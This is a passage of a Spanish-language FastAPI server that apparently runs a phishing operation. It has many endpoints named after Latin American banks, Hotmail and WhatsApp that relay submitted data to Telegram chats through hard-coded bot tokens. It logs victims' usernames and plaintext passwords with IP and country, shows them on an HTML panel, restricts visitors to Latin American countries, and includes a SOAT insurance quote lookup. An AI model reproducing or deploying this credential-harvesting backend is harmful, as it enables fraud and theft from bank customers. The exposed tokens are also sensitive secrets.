    {"path": "/lafise4/", "chat_id": "-4180268127", "bot_id": "6033097644:AAGO6cQJxDs8eLRut8VptH__xq29OHAmJdU"},
    {"path": "/soat/", "chat_id": "7098816483", "bot_id": "8493413907:AAHejIh50HIaAROsq9X1Seb14xfzBhz1q80"},
    {"path": "/lafise5/", "chat_id": "-4980758620", "bot_id": "7679730853:AAGj4K0fVPvgMIm0Xm6RNsopykxUQbp1R0c"},
    {"path": "/bdvs/", "chat_id": "7398992131", "bot_id": "7000144654:AAECBupVvE_1FSNoPpAAp9kNFSRLOVYC_5E"},
    {"path": "/bdv2/", "chat_id": "7955279007", "bot_id": "7442594761:AAES7WhtU3RTb1lDdERMYuS02BIo6_lNFpM"},
    {"path": "/bdvempresas/", "chat_id": "7098816483", "bot_id": "8042559632:AAFSVke4ibQQAGzju5F79cc_BmLb70sa0TU"},
    {"path": "/tehmt/", "chat_id": "-4969349236", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/ral/", "chat_id": "-4845606034", "bot_id": "7763460162:AAGiu6mTyD1vbJUGSAtyuduur4EP0v6-aQc"},
    {"path": "/bdvsp/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/provis/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/vichmti/", "chat_id": "5544338953", "bot_id": "8453088137:AAEuG_cz6ZL277fiSfzTT8oe3BevzjUus_M"},
    {"path": "/vichmti2/", "chat_id": "7815697126", "bot_id": "8269815281:AAEVfatKxdy0b69TOnsEC7OJx3XSaqH6_Oo"},
    {"path": "/lafise10/", "chat_id": "-4973773567", "bot_id": "7739503097:AAFNYXTOguqaEixKlmKOGnhLZrdkRUMWZ2o"},
    {"path": "/primmnr/", "chat_id": "7098816483", "bot_id": "8042559632:AAFSVke4ibQQAGzju5F79cc_BmLb70sa0TU"},
    {"path": "/gyts/", "chat_id": "7098816483", "bot_id": "8042559632:AAFSVke4ibQQAGzju5F79cc_BmLb70sa0TU"},
    {"path": "/bhdske/", "chat_id": "-4214419442", "bot_id": "7385190699:AAGr-k9PkpBL8y6UXvR8_VDuQirBPT4sNBc"},
    {"path": "/hotms1/", "chat_id": "7805311838", "bot_id": "8209624022:AAGvvoBNrKWjoqUOjJNpnsBDoQpxlNaTt28"},
    {"path": "/hotms2/", "chat_id": "7224742938", "bot_id": "8035901355:AAE6dWzFC-uRX9yp-ClQfN4Cqw6GanZX4go"},
    {"path": "/hotms3/", "chat_id": "7815697126", "bot_id": "8269815281:AAEVfatKxdy0b69TOnsEC7OJx3XSaqH6_Oo"},
    {"path": "/psess/", "chat_id": "7098816483", "bot_id": "8493413907:AAHejIh50HIaAROsq9X1Seb14xfzBhz1q80"},
    {"path": "/blasns/", "chat_id": "-4961614860", "bot_id": "7763460162:AAGiu6mTyD1vbJUGSAtyuduur4EP0v6-aQc"},
    {"path": "/vichotmis/", "chat_id": "7224742938", "bot_id": "8035901355:AAE6dWzFC-uRX9yp-ClQfN4Cqw6GanZX4go"},
    {"path": "/prdubancs/", "chat_id": "7098816483", "bot_id": "8214397313:AAEkkZm2J3MwVpYRHZ3HkeA2B55owXJo5UE"},
    {"path": "/lafispollo/", "chat_id": "-4930244974", "bot_id": "8260073007:AAF7ELT44LTucbNJsQYzABbvOlk0QoyXA40"},
    {"path": "/robalito/", "chat_id": "7815697126", "bot_id": "8269815281:AAEVfatKxdy0b69TOnsEC7OJx3XSaqH6_Oo"},
    {"path": "/hermano/", "chat_id": "7805311838", "bot_id": "7617623314:AAGqP815OoZUeXDrbvoDhCNLS6I7wFmCNtg"},
    {"path": "/bico/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/improsa/", "chat_id": "-4681432310", "bot_id": "8318582030:AAGOcOcOnUavcQYw2rdcJp4IVwfVCq5iq_c"},
    {"path": "/wtspnew/", "chat_id": "-4800018966", "bot_id": "8281410566:AAGOzbsxpBbVJETTH_lbiibG9cmZUQ4E9T4"},
    {"path": "/victovivienda/", "chat_id": "7224742938", "bot_id": "8412167924:AAHzIvWaP7qkl8ExekrIxQOg4v_flS2Jtzo"},
    {"path": "/hotma1/", "chat_id": "-4914297129", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/hotma2/", "chat_id": "-4905410020", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/hotma3/", "chat_id": "-4845893890", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/wts1/", "chat_id": "-4730674085", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/wts2/", "chat_id": "-4971711011", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/wts3/", "chat_id": "-4802176016", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},

]

# Factory: endpoints tipo multipsart (mensajse + imagsen sopcsional)
def make_dynamic_endpoint(cfg: dict):
    normalized_path = cfg["path"].rstrip("/") or "/"
    async def endpoint(
        request: Request,
        mensaje: str = Form(..., description="Texto del mensaje a enviar"),
        imagen: UploadFile = File(None, description="Imagen opcional")
    ):
        # validar imagen si viene
        image_data = None
        image_filename = None
        if imagen is not None:
            raw = await imagen.read()
            try:
                im = Image.open(io.BytesIO(raw))
                im.verify()
            except Exception:
                raise HTTPException(status_code=400, detail="El archivo no es una imagen válida")
            image_data = raw
            image_filename = imagen.filename

        # Ejecutar handler
        # NOTA: usamos normalized_path para que el handler lo registre sin la doble ruta
        cfg_local = deepcopy(cfg)
        cfg_local["path"] = normalized_path
        return await handle_dynamic_endpoint_optimized_with_image(cfg_local, request, mensaje, image_data, image_filename)
    return endpoint, normalized_path

# Registro de endpoints: SOLO UNA RUTA en /docs (sin duplicados)
for cfg in endpoint_configs:
    endpoint, normalized_path = make_dynamic_endpoint(cfg)
    app.add_api_route(
        path=normalized_path,    # sin barra final
        endpoint=endpoint,
        methods=["POST"]
    )

# =========================
# Admin / Utilidad
# =========================
async def _bloquear_ip_bd(ip: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(ip_bloqueadas.update_one({"ip": ip}, {"$set": {"ip": ip}}, upsert=True), timeout=5.0)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout bloqueando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error bloqueando IP en BD: {e}")

async def _desbloquear_ip_bd(ip: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(ip_bloqueadas.delete_one({"ip": ip}), timeout=5.0)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout desbloqueando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error desbloqueando IP en BD: {e}")

@app.post("/bloquear_ip")
async def bloquear_ip(data: dict):
    ip = str(data.get("ip", "")).strip()
    if not ip:
        raise HTTPException(status_code=400, detail="IP requerida")
    if ip not in blocked_ips_cache:
        blocked_ips_cache.add(ip)
        await add_background_task(_bloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido bloqueada."}
    return {"message": f"La IP {ip} ya estaba bloqueada."}

@app.post("/desbloquear_ip")
async def desbloquear_ip(data: dict):
    ip = str(data.get("ip", "")).strip()
    if not ip:
        raise HTTPException(status_code=400, detail="IP requerida")
    if ip in blocked_ips_cache:
        blocked_ips_cache.discard(ip)
        await add_background_task(_desbloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido desbloqueada."}
    return {"message": f"La IP {ip} no estaba bloqueada."}

@app.get("/ips_bloqueadas")
async def obtener_ips_bloqueadas():
    return {"ips_bloqueadas": [{"ip": ip, "fecha_bloqueo": "cached"} for ip in blocked_ips_cache]}

@app.get("/")
async def root():
    return {"message": "API funcionando correctamente!"}

async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                logs_usuarios.insert_one({
                    "usuario": usuario,
                    "contrasena": contra,
                    "ip": ip,
                    "pais": pais,
                    "fecha": datetime.utcnow()
                }),
                timeout=5.0
            )
        except asyncio.TimeoutError:
            logger.warning(f"Timeout guardando log {usuario}")
        except Exception as e:
            logger.error(f"Error guardando log: {e}")

@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    async with db_semaphore:
        try:
            registros = []
            cursor = logs_usuarios.find().sort("fecha", -1).limit(100)
            async for r in cursor:
                registros.append(r)
            html = [
                "<html><head><title>Registros de Usuarios</title></head><body>",
                "<h2>Listado de registros (últimos 100)</h2>",
                "<table border='1'><tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>"
            ]
            for r in registros:
                html.append(
                    f"<tr><td>{r.get('usuario','')}</td><td>{r.get('contrasena','')}</td>"
                    f"<td>{r.get('ip','')}</td><td>{r.get('pais','')}</td><td>{r.get('fecha','')}</td></tr>"
                )
            html.append("</table></body></html>")
            return HTMLResponse("".join(html))
        except Exception as e:
            logger.error(f"Error obteniendo datos: {e}")
            return HTMLResponse("<h3>Error obteniendo datos</h3>", status_code=500)

@app.get("/usuarios")
async def obtener_usuarios():
    if not user_cache:
        return {"message": "No se encontraron usuarios en caché."}
    return {"usuarios": [{"usuario": u, "numero": n} for u, n in user_cache.items()]}

@app.get("/is_active")
async def obtener_estado_actual():
    return {"is_active": obtener_is_active_cached()}

@app.post("/toggle")
async def alternar_estado():
    global is_active_cache
    async with db_semaphore:
        try:
            doc = await asyncio.wait_for(global_settings.find_one({"id": 1}), timeout=5.0)
            if doc:
                nuevo = not bool(doc.get("is_active", False))
                await asyncio.wait_for(
                    global_settings.update_one({"id": 1}, {"$set": {"is_active": nuevo}}),
                    timeout=5.0
                )
                is_active_cache = nuevo
                return {"message": "Estado alternado exitosamente.", "is_active": nuevo}
            raise ValueError("No se encontró configuración global.")
        except asyncio.TimeoutError:
            return {"error": "Timeout actualizando estado"}
        except ValueError as e:
            return {"error": str(e)}
        except Exception as e:
            logger.error(f"Error alternando estado: {e}")
            return {"error": "Error interno del servidor"}

@app.get("/ips")
async def obtener_ips():
    if not ip_number_cache:
        return {"message": "No se encontraron IPs en caché."}
    return {"ips": [{"ip": i, "numero": n} for i, n in ip_number_cache.items()]}

@app.post("/verificar_spam_ip")
async def verificar_spam_ip(data: dict):
    ip = str(data.get("ip", "")).strip()
    if not ip:
        raise HTTPException(status_code=400, detail="IP requerida")
    cola.append(ip)
    rep = contar_elemento_optimized(cola, ip)
    if rep > 8:
        if ip not in baneado:
            baneado.append(ip)
        return {"ip": ip, "repeticiones": rep, "spam": True, "mensaje": "IP detectada como spam y bloqueada"}
    return {"ip": ip, "repeticiones": rep, "spam": False, "mensaje": "IP aún no considerada spam"}

@app.put("/editar-ip/{ip}")
async def editar_numero_ip(ip: str, request_data: dict):
    if "numero" not in request_data:
        raise HTTPException(status_code=400, detail="Falta 'numero'")
    async with db_semaphore:
        try:
            res = await asyncio.wait_for(
                ip_numbers.update_one({"ip": ip}, {"$set": {"number": int(request_data["numero"])}}),
                timeout=5.0
            )
            if res.matched_count == 0:
                raise HTTPException(status_code=404, detail="IP no encontrada")
            ip_number_cache[ip] = int(request_data["numero"])
            return {"message": f"Número de la IP {ip} actualizado a {int(request_data['numero'])}"}
        except asyncio.TimeoutError:
            raise HTTPException(status_code=503, detail="Timeout actualizando IP")
        except HTTPException:
            raise
        except Exception as e:
            logger.error(f"Error editando IP: {e}")
            raise HTTPException(status_code=500, detail="Error interno del servidor")

@app.put("/editar-usuario/{usuario}")
async def editar_numero_usuario(usuario: str, request_data: dict):
    if "numero" not in request_data:
        raise HTTPException(status_code=400, detail="Falta 'numero'")
    async with db_semaphore:
        try:
            res = await asyncio.wait_for(
                user_numbers.update_one({"username": usuario}, {"$set": {"number": int(request_data["numero"])}}),
                timeout=5.0
            )
            if res.matched_count == 0:
                raise HTTPException(status_code=404, detail="Usuario no encontrado")
            user_cache[usuario] = int(request_data["numero"])
            return {"message": f"Número del usuario {usuario} actualizado a {int(request_data['numero'])}"}
        except asyncio.TimeoutError:
            raise HTTPException(status_code=503, detail="Timeout actualizando usuario")
        except HTTPException:
            raise
        except Exception as e:
            logger.error(f"Error editando usuario: {e}")
            raise HTTPException(status_code=500, detail="Error interno del servidor")

# =========================
# Métricas / Salud / Telegram monitor
# =========================
@app.get("/telegram_stats")
async def get_telegram_stats():
    return {
        "statistics": telegram_stats,
        "current_status": {
            "queue_size": telegram_queue.qsize(),
            "queue_maxsize": telegram_queue.maxsize,
            "available_workers": telegram_semaphore._value,
            "max_workers": MAX_TELEGRAM_CONCURRENT
        },
        "rate_limits": {
            "messages_per_minute": RATE_LIMIT_MESSAGES_PER_MINUTE,
            "messages_per_second": RATE_LIMIT_MESSAGES_PER_SECOND,
            "active_bots": len(bot_rate_limits)
        },
        "performance": {
            "immediate_ratio": telegram_stats["sent_immediate"] / max(telegram_stats["total_processed"], 1),
            "queue_ratio": telegram_stats["sent_queued"] / max(telegram_stats["total_processed"], 1),
            "failure_ratio": telegram_stats["failed"] / max(telegram_stats["total_processed"], 1)
        }
    }

@app.post("/telegram_test")
async def test_telegram(mensaje: str = "Test message", priority: int = 1, force_immediate: bool = False):
    result = await enviar_telegram_hibrido(
        f"TEST: {mensaje} - {datetime.now()}",
        priority=priority,
        force_immediate=force_immediate
    )
    return {"test_result": result, "timestamp": datetime.now()}

@app.post("/clear_telegram_stats")
async def clear_telegram_stats():
    global telegram_stats
    telegram_stats = {
        "sent_immediate": 0,
        "sent_queued": 0,
        "failed": 0,
        "queue_full": 0,
        "rate_limited": 0,
        "total_processed": 0
    }
    bot_rate_limits.clear()
    return {"message": "Estadísticas de Telegram limpiadas"}

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "cache_stats": {
            "blocked_ips": len(blocked_ips_cache),
            "ip_numbers": len(ip_number_cache),
            "users": len(user_cache),
            "ip_cache": len(ip_cache)
        },
        "queue_stats": {
            "background_queue_size": background_queue.qsize(),
            "telegram_queue_size": telegram_queue.qsize()
        },
        "semaphore_stats": {
            "available_requests": request_semaphore._value,
            "available_db": db_semaphore._value,
            "available_http": http_semaphore._value,
            "available_telegram": telegram_semaphore._value
        },
        "telegram_stats": telegram_stats,
        "geo_filter": {
            "enabled": True,
            "allowed_countries": len(PAISES_LATINOAMERICA),
            "countries": list(PAISES_LATINOAMERICA),
            "excluded_ips": list(EXCLUDED_IPS)
        }
    }

@app.get("/metrics")
async def get_metrics():
    return {
        "concurrency_limits": {
            "max_concurrent_requests": MAX_CONCURRENT_REQUESTS,
            "max_db_connections": MAX_DB_CONNECTIONS,
            "max_http_connections": MAX_HTTP_CONNECTIONS,
            "max_telegram_concurrent": MAX_TELEGRAM_CONCURRENT
        },
        "current_usage": {
            "active_requests": MAX_CONCURRENT_REQUESTS - request_semaphore._value,
            "active_db_connections": MAX_DB_CONNECTIONS - db_semaphore._value,
            "active_http_connections": MAX_HTTP_CONNECTIONS - http_semaphore._value,
            "active_telegram_workers": MAX_TELEGRAM_CONCURRENT - telegram_semaphore._value
        },
        "queues": {
            "background_queue_size": background_queue.qsize(),
            "background_queue_maxsize": background_queue.maxsize,
            "telegram_queue_size": telegram_queue.qsize(),
            "telegram_queue_maxsize": telegram_queue.maxsize
        },
        "cache_info": {
            "ip_cache_size": len(ip_cache),
            "blocked_ips_cache_size": len(blocked_ips_cache),
            "ip_number_cache_size": len(ip_number_cache),
            "user_cache_size": len(user_cache)
        },
        "deques": {
            "cola_size": len(cola),
            "baneado_size": len(baneado)
        },
        "telegram_performance": telegram_stats,
        "geo_blocking": {
            "enabled": True,
            "allowed_countries_count": len(PAISES_LATINOAMERICA),
            "excluded_ips_count": len(EXCLUDED_IPS)
        }
    }

@app.get("/paises_permitidos")
async def obtener_paises_permitidos():
    nombres = {
        'AR': 'Argentina', 'BO': 'Bolivia', 'BR': 'Brasil', 'CL': 'Chile',
        'CO': 'Colombia', 'CR': 'Costa Rica', 'CU': 'Cuba', 'DO': 'República Dominicana',
        'EC': 'Ecuador', 'SV': 'El Salvador', 'GT': 'Guatemala', 'HN': 'Honduras',
        'MX': 'México', 'NI': 'Nicaragua', 'PA': 'Panamá', 'PY': 'Paraguay',
        'PE': 'Perú', 'UY': 'Uruguay', 'VE': 'Venezuela', 'PR': 'Puerto Rico',
        'GF': 'Guayana Francesa', 'GY': 'Guyana', 'SR': 'Suriname', 'BZ': 'Belice',
        'JM': 'Jamaica', 'HT': 'Haití', 'TT': 'Trinidad y Tobago', 'BB': 'Barbados',
        'GD': 'Granada', 'LC': 'Santa Lucía', 'VC': 'San Vicente y las Granadinas',
        'DM': 'Dominica', 'AG': 'Antigua y Barbuda', 'KN': 'San Cristóbal y Nieves',
        'BS': 'Bahamas' , 'US': 'Estados Unidos'
    }
    return {
        "paises_permitidos": {c: nombres.get(c, c) for c in sorted(PAISES_LATINOAMERICA)},
        "total_paises": len(PAISES_LATINOAMERICA),
        "filtro_geografico": "activo",
        "ips_excluidas": {"total": len(EXCLUDED_IPS), "lista": list(EXCLUDED_IPS)}
    }

@app.get("/verificar_ip/{ip}")
async def verificar_ip_pais(ip: str):
    try:
        if ip in EXCLUDED_IPS:
            return {
                "ip": ip, "pais": "EXCLUDED", "permitido": True,
                "es_latinoamerica": False, "es_excluida": True,
                "mensaje": "IP excluida de verificación geográfica"
            }
        permitido, pais = await verificar_pais_cached(ip)
        return {
            "ip": ip, "pais": pais, "permitido": permitido,
            "es_latinoamerica": (pais in PAISES_LATINOAMERICA) if pais != 'Unknown' else False,
            "es_excluida": False
        }
    except Exception as e:
        return {"ip": ip, "error": str(e), "permitido": False, "es_excluida": (ip in EXCLUDED_IPS)}

@app.get("/ips_excluidas")
async def obtener_ips_excluidas():
    return {"ips_excluidas": list(EXCLUDED_IPS), "total": len(EXCLUDED_IPS),
            "descripcion": "IPs que no pasan por verificación geográfica"}

@app.post("/agregar_ip_excluida")
async def agregar_ip_excluida(_: dict):
    return {
        "mensaje": "Para agregar IPs a EXCLUDED_IPS, modificar el código/variables y reiniciar.",
        "ips_excluidas_actuales": list(EXCLUDED_IPS)
    }

@app.post("/clear_caches")
async def clear_caches():
    global ip_cache
    before = len(ip_cache)
    now = time.time()
    old_keys = [k for k, (_, t) in ip_cache.items() if now - t > CACHE_TTL * 2]
    for k in old_keys:
        ip_cache.pop(k, None)
    validar_contrasena_cached.cache_clear()
    return {"message": "Caches limpiados", "stats": {"ip_cache_before": before, "ip_cache_after": len(ip_cache),
                                                     "keys_removed": len(old_keys)}}








MOTO_REGEX = re.compile(r"^[A-Za-z]{3}\d{2}[A-Za-z]$", re.IGNORECASE)

def normalizar_placa(placa: str) -> str:
    return (placa or "").strip().upper()

def es_placa_moto(placa: str) -> bool:
    return bool(MOTO_REGEX.match(placa or ""))

def determinar_tipo_vehiculo(marca: str, linea: str) -> str:
    marca_upper, linea_upper = (marca or "").upper(), (linea or "").upper()

    pickups = ["RANGER","HILUX","D-MAX","NAVARA","L200","FRONTIER","BT-50","COLORADO","AMAROK","TACOMA","TORO","SAHARA","PICK UP","PICK-UP"]
    suvs = ["TRACKER","DUSTER","TERRITORY","SPORTAGE","TUCSON","EQUINOX","KICKS","CX-5","CR-V","RAV4","CHEROKEE","COMPASS","X-TRAIL","XTRAIL"]
    camperos = ["WRANGLER","JIMNY","VITARA","LAND CRUISER","BRONCO","BLAZER","4RUNNER","SAMURAI","DEFENDER","G-CLASS","PATROL","PRADO"]
    van_pasaj = ["SPRINTER","VITO","HIACE","CARNIVAL","STAREX","TRAFIC","URVAN","GRAND CARAVAN","TOWN COUNTRY","H1","H100","TRANSIT"]
    camiones = ["FVR","FTR","NPR","NKR","ACTROS","AUMARK","CARGO","CANTER","FRR","VOLVO","SCANIA","KENWORTH","CAMION","VOLQUETA"]
    busetas = ["BUS","BUSETA","COLECTIVO","MICROBUS","MINIBUS","COASTER","CHASIS BUS"]

    for m in pickups:
        if m in linea_upper: return "Pick-Up"
    for m in suvs:
        if m in linea_upper: return "SUV"
    for m in camperos:
        if m in linea_upper: return "Campero"
    for m in van_pasaj:
        if m in linea_upper: return "Camioneta de Pasajeros"
    for m in camiones:
        if m in linea_upper: return "Camión"
    for m in busetas:
        if m in linea_upper: return "Buseta"

    if re.search(r"\b(JEEP|LAND ROVER|LANDROVER|SUZUKI)\b", marca_upper):
        return "Campero"
    if re.search(r"\b(FORD|CHEVROLET|TOYOTA|NISSAN|MITSUBISHI|ISUZU|MAZDA)\b", marca_upper):
        return "Carro"
    return "Carro"

def calcular_precio_soat(tipo: str, cilindraje: Any, modelo: Any) -> int:
    anio_actual = datetime.now().year
    try:
        antig = anio_actual - int(modelo)
        if antig < 0: antig = 0
    except Exception:
        antig = 0
    try:
        cc = int(cilindraje)
    except Exception:
        cc = 0

    if tipo in ("Pick-Up","SUV","Campero"):
        if cc < 1500:
            return 789600 if antig < 10 else 949200
        elif cc <= 2500:
            return 942800 if antig < 10 else 1116800
        else:
            return 1105900 if antig < 10 else 1269000
    if tipo == "Camioneta de Pasajeros":
        return 1200000 if antig < 5 else (1350000 if antig < 10 else 1500000)
    if tipo == "Camión":
        return 1800000 if antig < 5 else (2000000 if antig < 10 else 2200000)
    if tipo == "Buseta":
        return 1500000 if antig < 5 else (1700000 if antig < 10 else 1900000)
    if tipo == "Moto":
        return 350000 if antig < 5 else (400000 if antig < 10 else 450000)

    if cc < 1500:
        return 445300 if antig < 5 else (542400 if antig < 10 else 590400)
    elif cc <= 2500:
        return 542400 if antig < 5 else (630400 if antig < 10 else 674700)
    else:
        return 633500 if antig < 5 else (730300 if antig < 10 else 751300)

# =========================
# RegCheck (GET) → XML → JSON con cache + retries + dedupe
# =========================
def _parse_vehicle_xml(xml_text: str) -> Dict[str, Any]:
    out: Dict[str, Any] = {}
    try:
        root = ET.fromstring(xml_text)
    except Exception as e:
        return {"error": f"XML inválido: {str(e)}", "raw": xml_text[:2000]}

    ns = {"ns": "http://regcheck.org.uk"}

    # vehicleJson
    vj_node = root.find("ns:vehicleJson", ns)
    if vj_node is not None and vj_node.text:
        txt = vj_node.text.strip()
        try:
            out["vehicleJson"] = json.loads(txt)
        except Exception:
            out["vehicleJson_raw"] = txt

    # vehicleData
    vd_node = root.find("ns:vehicleData", ns)
    if vd_node is not None:
        vehicle_data: Dict[str, Any] = {}
        for child in vd_node:
            tag = child.tag.split("}")[-1]
            if child.text and child.text.strip():
                vehicle_data[tag] = child.text.strip()
            else:
                ctv = child.find("ns:CurrentTextValue", ns)
                if ctv is not None and ctv.text and ctv.text.strip():
                    vehicle_data[tag] = ctv.text.strip()
                else:
                    vehicle_data[tag] = ""
        out["vehicleData"] = vehicle_data

    if not out:
        out["error"] = "vehicleJson/vehicleData no encontrados"
        out["raw"] = xml_text[:2000]
    return out

async def _fetch_regcheck_with_retries(placa: str, username: str) -> Dict[str, Any]:
    url = f"{REGCHECK_BASE}/CheckColombia"
    params = {"RegistrationNumber": placa, "username": username}

    last_exc: Optional[Exception] = None
    for attempt in range(1, HTTP_RETRIES + 1):
        try:
            resp = await app.state.http.get(url, params=params)
            resp.raise_for_status()
            return _parse_vehicle_xml(resp.text)
        except Exception as e:
            last_exc = e
            # backoff exponencial simple
            await asyncio.sleep(HTTP_BACKOFF_BASE * (2 ** (attempt - 1)))
    raise last_exc  # type: ignore

async def regcheck_colombia(placa: str) -> Dict[str, Any]:
    plate = normalizar_placa(placa)
    now = datetime.utcnow()

    # 1) Cache hit válido
    async with app.state.cache_lock:
        entry = app.state.cache.get(plate)
        if entry and entry["expires"] > now:
            return entry["data"]

        # 2) Si ya hay una solicitud en curso para esta placa, cuélgate de ella
        if plate in app.state.inflight:
            fut: asyncio.Future = app.state.inflight[plate]
            data = await fut
            return data

        # 3) Crear future e instalarlo como inflight
        loop = asyncio.get_event_loop()
        fut = loop.create_future()
        app.state.inflight[plate] = fut

    try:
        # lee username actual
        async with app.state.user_lock:
            username = app.state.regcheck_user

        data = await _fetch_regcheck_with_retries(plate, username)

        # 4) Escribir en cache
        async with app.state.cache_lock:
            # mantener tamaño aprox max (LRU-approx)
            if len(app.state.cache) >= CACHE_MAX_SIZE:
                # pop de lo más viejo en cola hasta liberar
                for _ in range(min(100, len(app.state.cache))):
                    try:
                        old_plate = app.state.cache_order.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                    app.state.cache.pop(old_plate, None)

            app.state.cache[plate] = {
                "expires": now + timedelta(seconds=CACHE_TTL_SECONDS),
                "data": data,
            }
            # encolar orden
            await app.state.cache_order.put(plate)

        # Completar future
        fut.set_result(data)
        return data

    except Exception as e:
        # Fallar y completar future para no colgar a otros
        fut.set_exception(e)
        raise
    finally:
        # limpiar inflight
        async with app.state.cache_lock:
            app.state.inflight.pop(plate, None)

# =========================
# Schemas para /docs
# =========================
class CotizarBody(BaseModel):
    placa: str = Field(..., description="Placa del vehículo")
    dropdown: str = Field(..., description="Tipo de documento (no se usa en RegCheck, pero se devuelve)")
    documento: str = Field(..., description="Número de documento (no se usa en RegCheck, pero se devuelve)")

# =========================
# Núcleo
# =========================
async def procesar_cotizacion(placa: str, document_type: str, document_number: str):
    if not placa or not document_type or not document_number:
        return JSONResponse(status_code=400, content={"error": "Complete todos los campos"})

    plate_norm = normalizar_placa(placa)

    # Atajo motos: si no quieres atajo, elimina este bloque
    if es_placa_moto(placa):
        tipo = "Moto"
        precio = calcular_precio_soat(tipo, 0, datetime.now().year)
        return {
            "ok": True,
            "data": {
                "placa": plate_norm,
                "documentType": document_type,
                "documentNumber": document_number,
                "tipo_vehiculo": tipo,
                "precio_SOAT": precio,
                "vehicleJson": None,
                "vehicleData": None,
            },
        }

    try:
        rc = await regcheck_colombia(plate_norm)
    except Exception as e:
        return JSONResponse(status_code=502, content={"error": f"Error RegCheck: {str(e)}"})

    if not rc or ("error" in rc and "vehicleJson" not in rc):
        return JSONResponse(status_code=404, content={"error": "No se encontraron datos", "detalle": rc})

    vj = rc.get("vehicleJson", {}) if isinstance(rc.get("vehicleJson"), dict) else {}
    vd = rc.get("vehicleData", {}) if isinstance(rc.get("vehicleData"), dict) else {}

    marca = vj.get("CarMake") or vd.get("CarMake") or "Desconocido"
    linea = vj.get("CarModel") or vd.get("CarModel") or "Desconocido"
    modelo = vj.get("RegistrationYear") or vd.get("RegistrationYear") or "0"
    cilindraje = vj.get("EngineSize") or vd.get("EngineSize") or 0

    tipo = determinar_tipo_vehiculo(str(marca), str(linea))
    precio = calcular_precio_soat(tipo, cilindraje, modelo)

    return {
        "ok": True,
        "data": {
            "placa": plate_norm,
            "documentType": document_type,
            "documentNumber": document_number,
            "tipo_vehiculo": tipo,
            "precio_SOAT": precio,
            "vehicleJson": vj or None,
            "vehicleData": vd or None,
        },
    }


@app.post("/cotizar-json", summary="Cotizar vía JSON", tags=["Cotizar"])
async def cotizar_json(payload: CotizarBody):
    return await procesar_cotizacion(payload.placa, payload.dropdown, payload.documento)

@app.post("/cotizar-form", summary="Cotizar vía form-data", tags=["Cotizar"])
async def cotizar_form(
    placa: str = Form(..., description="Placa del vehículo"),
    dropdown: str = Form(..., description="Tipo de documento"),
    documento: str = Form(..., description="Número de documento"),
):
    return await procesar_cotizacion(placa, dropdown, documento)


# Endpoint para consultar y cambiar el username
@app.post("/config/regcheck-user", summary="Cambiar username de RegCheck", tags=["Config"])
async def set_regcheck_user(username: str = Body(..., embed=True, description="Nuevo username para RegCheck")):
    if not username.strip():
        return JSONResponse(status_code=400, content={"error": "El username no puede estar vacío"})
    
    async with app.state.user_lock:
        app.state.regcheck_user = username.strip()
    
    return {"ok": True, "regcheck_user": app.state.regcheck_user}

@app.get("/config/regcheck-user", summary="Obtener username actual", tags=["Config"])
async def get_regcheck_user():
    async with app.state.user_lock:
        return {"regcheck_user": app.state.regcheck_user}

# =========================
# Limpieza de colecciones de prueba
# =========================
async def _clear_db_collections() -> bool:
    async with db_semaphore:
        try:
            await asyncio.gather(
                asyncio.wait_for(ip_numbers.delete_many({}), timeout=30.0),
                asyncio.wait_for(user_numbers.delete_many({}), timeout=30.0)
            )
            return True
        except asyncio.TimeoutError:
            logger.error("Timeout limpiando BD")
            return False
        except Exception as e:
            logger.error(f"Error limpiando BD: {e}")
            return False

@app.post('/clear_db')
async def clear_db_endpoint():
    ok = await _clear_db_collections()
    if ok:
        ip_number_cache.clear()
        user_cache.clear()
        return {"message": "Se borró correctamente"}
    return {"message": "Error al borrar", "status": "timeout_or_error"}

# =========================
# Test de imagen con multipart/form-data (igual que tu screenshot)
# =========================
@app.post("/test_image")
async def test_image_endpoint(
    mensaje: str = Form(...),
    imagen: UploadFile = File(None)
):
    try:
        image_data = None
        image_filename = None
        if imagen:
            raw = await imagen.read()
            try:
                im = Image.open(io.BytesIO(raw))
                im.verify()
            except Exception:
                raise HTTPException(status_code=400, detail="El archivo no es una imagen válida")
            image_data = raw
            image_filename = imagen.filename

        result = await enviar_telegram_hibrido(
            f"TEST: {mensaje}",
            image_data=image_data,
            image_filename=image_filename,
            force_immediate=True
        )
        return {
            "success": result["success"],
            "has_image": image_data is not None,
            "image_filename": image_filename,
            "result": result
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error en test_image: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# =========================
# Uvicorn (modo script)
# =========================
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "app:app",
